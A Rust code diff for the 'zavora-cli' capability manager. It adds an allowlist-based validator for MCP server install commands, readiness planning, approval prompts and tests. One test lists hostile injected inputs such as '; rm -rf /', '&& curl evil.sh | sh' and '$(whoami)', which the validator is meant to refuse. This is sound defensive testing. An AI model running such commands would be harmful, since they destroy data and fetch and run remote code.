@@ -316,6 +316,30 @@ pub fn save_state(path: &Path, state: &CapabilityState) -> Result<()> {
         .with_context(|| format!("failed to write capability state '{}'", path.display()))
 }
 
+/// Whether the running tool surface still matches what is configured.
+///
+/// Enabling a capability writes MCP servers into the profile, but the surface the
+/// agent is using was sealed before they existed — sealing is deliberately
+/// one-shot, so it cannot be amended in place. This flag is how the tool tells the
+/// workspace that a rebuild is owed. The workspace consumes it between turns:
+/// re-resolving mid-turn would swap the tool surface out from under an in-flight
+/// request.
+static SURFACE_STALE: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
+
+/// Record that configuration has moved ahead of the running tool surface.
+pub fn mark_surface_stale() {
+    SURFACE_STALE.store(true, std::sync::atomic::Ordering::SeqCst);
+}
+
+/// Take the stale flag, clearing it.
+///
+/// Clearing on read means a failed rebuild does not spin: the next enable sets it
+/// again, and a transient connection failure is reported rather than retried
+/// forever.
+pub fn take_surface_stale() -> bool {
+    SURFACE_STALE.swap(false, std::sync::atomic::Ordering::SeqCst)
+}
+
 pub fn set_pack_enabled(path: &Path, id: &str, enabled: bool) -> Result<bool> {
     if find_pack(id).is_none() {
         return Err(anyhow::anyhow!(
@@ -336,6 +360,260 @@ pub fn packs_for_category(
     category: CapabilityCategory,
 ) -> impl Iterator<Item = &'static CapabilityPack> {
     PACKS.iter().filter(move |pack| pack.category == category)
+}
+
+/// Programs a curated install line is permitted to invoke.
+///
+/// The catalogue's install lines are static, so this cannot be reached by
+/// anything a model or a prompt supplies. It exists so a future catalogue edit
+/// cannot smuggle in a different program, and so the install path never needs a
+/// shell.
+pub const INSTALL_PROGRAMS: &[&str] = &["cargo", "npm"];
+
+/// Characters that would give an install line shell semantics.
+const SHELL_METACHARACTERS: &[char] = &[
+    ';', '|', '&', '$', '>', '<', '`', '(', ')', '{', '}', '\n', '\r', '\\', '\'', '"', '*', '?',
+    '~', '#', '!',
+];
+
+/// Split a curated install line into an argument vector.
+///
+/// Returns an error rather than a best guess when the line is not something this
+/// code is willing to run. Installing is the one action here that executes
+/// third-party code, so the command must be exact and must never reach a shell:
+/// the argument vector is handed to `Command` directly, so metacharacters would
+/// be passed through literally rather than interpreted — but a line containing
+/// them is a sign the catalogue changed shape, and guessing would be worse than
+/// refusing.
+pub fn install_argv(line: &str) -> Result<Vec<&str>> {
+    if let Some(bad) = line.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
+        return Err(anyhow::anyhow!(
+            "install command '{line}' contains '{bad}', which this installer will not run"
+        ));
+    }
+    let argv: Vec<&str> = line.split_whitespace().collect();
+    let program = argv
+        .first()
+        .ok_or_else(|| anyhow::anyhow!("install command is empty"))?;
+    if !INSTALL_PROGRAMS.contains(program) {
+        return Err(anyhow::anyhow!(
+            "install command '{line}' invokes '{program}', which is not one of {:?}",
+            INSTALL_PROGRAMS
+        ));
+    }
+    Ok(argv)
+}
+
+/// Whether a program can be found on `PATH`.
+///
+/// Resolved directly rather than by running `which`, so nothing is executed just
+/// to answer the question.
+pub fn program_on_path(program: &str) -> bool {
+    if program.contains('/') {
+        return Path::new(program).is_file();
+    }
+    let Some(path) = std::env::var_os("PATH") else {
+        return false;
+    };
+    std::env::split_paths(&path).any(|dir| {
+        let candidate = dir.join(program);
+        candidate.is_file() || cfg!(windows) && candidate.with_extension("exe").is_file()
+    })
+}
+
+/// How ready one MCP server of a capability is.
+///
+/// `installed` and `configured` are separate because they fail separately, and
+/// neither implies the server is usable. There is deliberately no `connected`
+/// field: connection can only be established by a live handshake, which
+/// `zavora-cli mcp doctor` performs. Reporting it from static state would be the
+/// exact overclaim the workspace instructions forbid.
+///
+/// `command` and `install` are absent when the server is named by a capability
+/// but has no entry in the curated MCP catalogue. Most are: the packs describe an
+/// intended surface, and the catalogue currently covers a minority of it. Such a
+/// server cannot be provisioned at all, and saying so is the difference between a
+/// capability that works and one that merely reports `enabled = true`.
+#[derive(Debug, Clone, Serialize)]
+pub struct ServerReadiness {
+    pub id: String,
+    pub name: Option<&'static str>,
+    pub command: Option<&'static str>,
+    pub install: Option<&'static str>,
+    /// The server has a curated catalogue entry, so it can be provisioned.
+    pub available: bool,
+    /// The server's program resolves on `PATH`.
+    pub installed: bool,
+    /// The server is listed in this profile's `mcp_servers`.
+    pub configured: bool,
+}
+
+/// What enabling a capability would actually change.
+///
+/// Computed before asking the developer, so the approval names the specific
+/// install commands rather than the capability in the abstract.
+#[derive(Debug, Clone, Serialize)]
+pub struct EnablePlan {
+    pub pack_id: &'static str,
+    pub pack_name: &'static str,
+    pub description: &'static str,
+    pub risk: CapabilityRisk,
+    pub maturity: CapabilityMaturity,
+    pub agent: &'static str,
+    pub already_enabled: bool,
+    pub servers: Vec<ServerReadiness>,
+}
+
+impl EnablePlan {
+    /// Servers that have a curated catalogue entry.
+    pub fn provisionable(&self) -> Vec<&ServerReadiness> {
+        self.servers.iter().filter(|s| s.available).collect()
+    }
+
+    /// Servers this capability names but which cannot be provisioned.
+    pub fn unavailable(&self) -> Vec<&ServerReadiness> {
+        self.servers.iter().filter(|s| !s.available).collect()
+    }
+
+    /// Servers whose program is missing and would be installed.
+    pub fn to_install(&self) -> Vec<&ServerReadiness> {
+        self.servers
+            .iter()
+            .filter(|s| s.available && !s.installed)
+            .collect()
+    }
+
+    /// Servers not yet present in the profile's configuration.
+    pub fn to_configure(&self) -> Vec<&ServerReadiness> {
+        self.servers
+            .iter()
+            .filter(|s| s.available && !s.configured)
+            .collect()
+    }
+
+    /// Whether applying this plan would change nothing.
+    pub fn is_noop(&self) -> bool {
+        self.already_enabled && self.to_install().is_empty() && self.to_configure().is_empty()
+    }
+
+    /// The question put to the developer before anything is installed.
+    ///
+    /// Names the capability and every install command, because "enable office
+    /// support" and "compile and install four programs from the internet" are the
+    /// same request described at two very different levels of consequence, and
+    /// only the second one is what actually happens. Kept compact: the approval
+    /// panel truncates.
+    pub fn approval_prompt(&self) -> String {
+        // Say so before asking. A capability with nothing installable is refused
+        // when applied, so presenting it as a decision would be asking the
+        // developer to approve a no-op.
+        if self.provisionable().is_empty() {
+            return format!(
+                "\"{}\" ({}) cannot be enabled: none of its {} MCP servers has an \
+                 installable package in the curated catalogue, so enabling it would \
+                 change a flag and nothing else.",
+                self.pack_name,
+                self.pack_id,
+                self.servers.len(),
+            );
+        }
+        let installs = self.to_install();
+        let mut out = if installs.is_empty() {
+            format!("Enable \"{}\" ({})?\n", self.pack_name, self.pack_id)
+        } else {
+            format!(
+                "Install {} {} to enable \"{}\" ({})?\n",
+                installs.len(),
+                if installs.len() == 1 {
+                    "package"
+                } else {
+                    "packages"
+                },
+                self.pack_name,
+                self.pack_id
+            )
+        };
+        for server in &installs {
+            if let Some(install) = server.install {
+                out.push_str(&format!("  {install}\n"));
+            }
+        }
+        let configure = self.to_configure().len();
+        if configure > 0 {
+            out.push_str(&format!(
+                "Then configures {configure} MCP server{} and enables the capability.\n",
+                if configure == 1 { "" } else { "s" }
+            ));
+        }
+        // Never let the count of what will work be inferred from the count of
+        // what the capability claims.
+        let unavailable = self.unavailable().len();
+        if unavailable > 0 {
+            out.push_str(&format!(
+                "{unavailable} of this capability's {} servers have no installable package and will stay missing.\n",
+                self.servers.len()
+            ));
+        }
+        out.push_str(&format!(
+            "risk {} · {} · runs third-party code · enabling does not make the servers usable until they connect.",
+            self.risk, self.maturity,
+        ));
+        out
+    }
+}
+
+/// Work out what enabling `pack_id` would change, without changing anything.
+pub fn plan_enable(pack_id: &str, config_path: &Path, profile: &str) -> Result<EnablePlan> {
+    let pack = find_pack(pack_id).ok_or_else(|| {
+        anyhow::anyhow!(
+            "capability '{pack_id}' is not one of the built-in capabilities. \
+             Run 'zavora-cli capabilities list'."
+        )
+    })?;
+    let configured =
+        crate::mcp_catalog::configured_server_ids(config_path, profile).unwrap_or_default();
+    let enabled = load_state(&state_path())
+        .map(|state| state.enabled_packs.contains(pack_id))
+        .unwrap_or(false);
+
+    // Every server the pack names is reported, including the ones with no
+    // catalogue entry. Dropping those would make a pack that cannot work look
+    // like one that merely needs installing.
+    let servers = pack
+        .servers
+        .iter()
+        .map(|id| match crate::mcp_catalog::find_entry(id) {
+            Some(entry) => ServerReadiness {
+                id: entry.id.to_string(),
+                name: Some(entry.name),
+                command: Some(entry.command),
+                install: Some(entry.install),
+                available: true,
+                installed: program_on_path(entry.command),
+                configured: configured.contains(entry.id),
+            },
+            None => ServerReadiness {
+                id: (*id).to_string(),
+                name: None,
+                command: None,
+                install: None,
+                available: false,
+                installed: false,
+                configured: configured.contains(*id),
+            },
+        })
+        .collect();
+
+    Ok(EnablePlan {
+        pack_id: pack.id,
+        pack_name: pack.name,
+        description: pack.description,
+        risk: pack.risk,
+        maturity: pack.maturity,
+        agent: pack.agent,
+        already_enabled: enabled,
+        servers,
+    })
 }
 
 pub fn search_packs(query: &str) -> Vec<&'static CapabilityPack> {
@@ -1112,5 +1390,156 @@ mod tests {
         let state = load_state(&path).expect("load");
         assert!(state.enabled_packs.contains("research.core"));
         assert!(set_pack_enabled(&path, "research.core", false).expect("disable"));
+    }
+
+    /// Every server a capability names must have a catalogue entry.
+    ///
+    /// Without this, adding a server to a pack silently produces a capability
+    /// that reports a surface it cannot provision — which is how four packs came
+    /// to name only servers that did not exist. The failure is a missing
+    /// catalogue entry, so it belongs here rather than at the point of use.
+    #[test]
+    fn every_capability_server_is_in_the_catalogue() {
+        let mut gaps: Vec<String> = Vec::new();
+        for pack in built_in_packs() {
+            for server in pack.servers {
+                if crate::mcp_catalog::find_entry(server).is_none() {
+                    gaps.push(format!("{} references '{server}'", pack.id));
+                }
+            }
+        }
+        assert!(
+            gaps.is_empty(),
+            "capabilities name servers with no catalogue entry:\n  {}",
+            gaps.join("\n  ")
+        );
+    }
+
+    /// Every capability can actually be provisioned.
+    ///
+    /// The stronger form of the check above: not just that entries exist, but
+    /// that planning finds something installable for each pack. A pack with
+    /// nothing to provision is refused at enable time, so one here means a
+    /// capability the workspace advertises and cannot deliver.
+    #[test]
+    fn every_capability_has_something_to_provision() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let config = dir.path().join("config.toml");
+        for pack in built_in_packs() {
+            let plan = plan_enable(pack.id, &config, "default").expect("a built-in pack");
+            assert!(
+                plan.unavailable().is_empty(),
+                "'{}' cannot provision: {:?}",
+                pack.id,
+                plan.unavailable()
+                    .iter()
+                    .map(|server| server.id.as_str())
+                    .collect::<Vec<_>>()
+            );
+            assert_eq!(
+                plan.provisionable().len(),
+                pack.servers.len(),
+                "'{}' should be fully provisionable",
+                pack.id
+            );
+        }
+    }
+
+    /// Every curated install line must be something the installer will run.
+    ///
+    /// This is the guard that keeps installing from needing a shell. If a
+    /// catalogue entry is ever edited into a compound command, this fails here
+    /// rather than at somebody's machine.
+    #[test]
+    fn every_catalogue_install_line_is_runnable_without_a_shell() {
+        for entry in crate::mcp_catalog::catalog_entries() {
+            let argv = install_argv(entry.install).unwrap_or_else(|error| {
+                panic!("catalogue entry '{}' is not runnable: {error}", entry.id)
+            });
+            assert!(
+                INSTALL_PROGRAMS.contains(&argv[0]),
+                "'{}' invokes '{}', which is not allowlisted",
+                entry.id,
+                argv[0]
+            );
+            assert!(argv.len() > 1, "'{}' has no arguments", entry.id);
+        }
+    }
+
+    /// A line that would mean something to a shell is refused, not run.
+    #[test]
+    fn install_lines_with_shell_semantics_are_refused() {
+        for line in [
+            "cargo install docx-mcp-server; rm -rf /",
+            "cargo install foo && curl evil.sh | sh",
+            "cargo install $(whoami)",
+            "cargo install `id`",
+            "cargo install foo > /etc/passwd",
+            "npm install --global foo || wget x",
+        ] {
+            let refused = install_argv(line);
+            assert!(
+                refused.is_err(),
+                "'{line}' should have been refused, got {refused:?}"
+            );
+        }
+    }
+
+    /// Only the allowlisted package managers may be invoked.
+    #[test]
+    fn only_allowlisted_programs_may_be_invoked() {
+        for line in [
+            "sh -c anything",
+            "bash install.sh",
+            "curl https://example.com/install.sh",
+            "sudo cargo install foo",
+            "python -m pip install foo",
+        ] {
+            assert!(
+                install_argv(line).is_err(),
+                "'{line}' invokes a program that is not allowlisted"
+            );
+        }
+        assert!(install_argv("cargo install docx-mcp-server").is_ok());
+        assert!(install_argv("npm install --global @zavora-ai/computer-use-mcp").is_ok());
+    }
+
+    /// Planning changes nothing and reports the states separately.
+    #[test]
+    fn planning_reports_state_without_changing_anything() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let config = dir.path().join("config.toml");
+
+        let plan = plan_enable("productivity.office", &config, "default").expect("plan");
+        assert_eq!(plan.pack_id, "productivity.office");
+        assert_eq!(
+            plan.servers.len(),
+            5,
+            "every server the pack names must be reported, catalogued or not"
+        );
+        // Every named server now has a catalogue entry, so nothing is dropped and
+        // nothing is unprovisionable. `every_capability_server_is_in_the_catalogue`
+        // keeps it that way.
+        assert!(plan.unavailable().is_empty());
+        assert_eq!(plan.provisionable().len(), 5);
+        assert!(plan.servers.iter().all(|server| server.install.is_some()));
+        // Nothing is configured in a fresh config, so every provisionable server
+        // needs configuring — and only those.
+        assert_eq!(plan.to_configure().len(), plan.provisionable().len());
+        assert!(
+            !config.exists(),
+            "planning must not create the config it is describing"
+        );
+
+        // An unknown id is an error rather than an empty plan.
+        assert!(plan_enable("nope", &config, "default").is_err());
+    }
+
+    /// `installed` is answered without executing anything.
+    #[test]
+    fn program_lookup_resolves_on_path() {
+        // `cargo` built these tests, so it is on PATH.
+        assert!(program_on_path("cargo"));
+        assert!(!program_on_path("definitely-not-a-real-program-xyzzy"));
     }
 }
